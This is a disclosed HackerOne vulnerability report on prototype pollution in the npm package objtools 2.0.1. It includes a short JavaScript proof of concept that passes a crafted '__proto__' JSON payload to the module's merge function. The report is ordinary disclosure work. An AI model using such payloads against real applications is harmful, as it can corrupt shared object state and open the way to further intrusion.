# [H] [objtools] Prototype pollution

## Summary
Severity: High
Program: Node.js third-party modules
Weakness: Modification of Assumed-Immutable Data (MAID)
Reporter: d3lla
State: resolved
Disclosed: 2020-09-14T10:51:58.317Z
Source: https://hackerone.com/reports/878394

## Details
I would like to report a `prototype pollution` vulnerability in `objtools` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `objtools`
**version:** `2.0.1`
**npm page:** `https://www.npmjs.com/package/objtools`

## Module Description

objtools provides several utility functions for working with structured objects. Basic examples of how to use are provided below. See the docs directory for full information.

## Module Stats

[30] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `objtools` module:
    - `npm i objtools`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
objtools.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:

_Trimmed to 38 lines — full report: https://hackerone.com/reports/878394_
